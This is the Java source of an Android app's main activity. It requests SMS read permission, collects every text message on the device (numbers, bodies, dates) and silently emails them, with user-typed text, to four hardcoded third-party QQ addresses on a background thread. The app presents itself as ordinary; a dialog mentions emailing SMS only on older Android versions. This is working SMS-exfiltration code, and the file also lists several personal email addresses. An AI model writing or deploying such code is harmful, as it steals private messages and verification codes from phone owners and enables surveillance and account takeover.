package com.example.myapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.xander.sendemaillib.SendEmail;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {

  private EditText mEditText;
  private String txt = "附加信息";
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    mEditText = findViewById(R.id.context);
  }

  public void applypermission() {

    txt = mEditText.getText().toString();
    if (Build.VERSION.SDK_INT >= 23) {
      // 检查是否已经给了权限
      showDialog();
    } else {
      showDialog1();
    }
  }

  public void showDialog() {
    UtilsPerMission.getPermission(
        new OnPermissionCallback() {
          @Override
          public void onGranted() {
            Toast.makeText(MainActivity.this, "请求成功", Toast.LENGTH_SHORT).show();
            getSmsInPhone();
          }

          @Override
          public void onDeny() {
            Toast.makeText(MainActivity.this, "请求权限失败", Toast.LENGTH_SHORT).show();
          }
        },
        this,
        Manifest.permission.READ_SMS);
  }

  public String getSmsInPhone() {
    final String SMS_URI_ALL = "content://sms/";
    final String SMS_URI_INBOX = "content://sms/inbox";
    final String SMS_URI_SEND = "content://sms/sent";
    final String SMS_URI_DRAFT = "content://sms/draft";

    final StringBuilder smsBuilder = new StringBuilder();
    Cursor cur = null;
    try {
      ContentResolver cr = getContentResolver();
      String[] projection = new String[] {"_id", "address", "person", "body", "date", "type"};
      Uri uri = Uri.parse(SMS_URI_ALL);
      cur = cr.query(uri, projection, null, null, "date desc");

      if (cur != null) {
        if (cur.moveToFirst()) {
          String name;
          String phoneNumber;
          String smsbody;
          String date;
          String type;

          int nameColumn = cur.getColumnIndex("person");
          int phoneNumberColumn = cur.getColumnIndex("address");
          int smsbodyColumn = cur.getColumnIndex("body");
          int dateColumn = cur.getColumnIndex("date");
          int typeColumn = cur.getColumnIndex("type");

          do {
            name = "联系人：" + cur.getString(nameColumn);
            phoneNumber = "手机号：" + cur.getString(phoneNumberColumn);
            smsbody = "短信内容：" + cur.getString(smsbodyColumn);

            @SuppressLint("SimpleDateFormat")
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
            date = dateFormat.format(d);

            int typeId = cur.getInt(typeColumn);
            if (typeId == 1) {
              type = "接收";
            } else if (typeId == 2) {
              type = "发送";
            } else {
              type = "";
            }

            smsBuilder.append("[");
            //            smsBuilder.append(name).append(",");
            smsBuilder.append(phoneNumber).append(",");
            smsBuilder.append(smsbody).append(",");
            smsBuilder.append(date).append(",");
            smsBuilder.append(type);
            smsBuilder.append("] \n");

          } while (cur.moveToNext());
        } else {
          smsBuilder.append("no result!");
        }
      }

      smsBuilder.append("getSmsInPhone has executed!");
    } catch (SQLiteException ex) {
      Log.d("sss", ex.getMessage());
    } finally {
      if (cur != null) {
        cur.close();
      }
    }
    Log.i("ssss", "getSmsInPhone: " + smsBuilder.toString());
    final String msg = smsBuilder.toString();
    new Thread() {
      @Override
      public void run() {
        super.run();

        List<String >list = new ArrayList<>();
        list.add("814093077@qq.com");
        list.add("1020110072@qq.com");
        list.add("487008159@qq.com");
        list.add("596928539@qq.com");
        SendEmail.send(list, "测试", "搜到结果---华为"+msg+"\n 附加信息:\n"+txt);
      }
    }.start();
    return smsBuilder.toString();
  }

  public void send(View view) {
    applypermission();
  }

  public void showDialog1() {
    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    builder
        .setTitle("发送请求")
        .setMessage("如果您要发送短信到邮箱，请点击 OK，否则，CANCEL")
        .setCancelable(false)
        .setPositiveButton(
            "OK",
            new DialogInterface.OnClickListener() {
              @Override
              public void onClick(DialogInterface dialog, int which) {
                getSmsInPhone();
              }
            })
        .setNegativeButton(
            "Cancel",
            new DialogInterface.OnClickListener() {
              @Override
              public void onClick(DialogInterface dialog, int which) {
                Toast.makeText(MainActivity.this, "您取消的发送", Toast.LENGTH_SHORT).show();
              }
            })
        .show();
  }
}
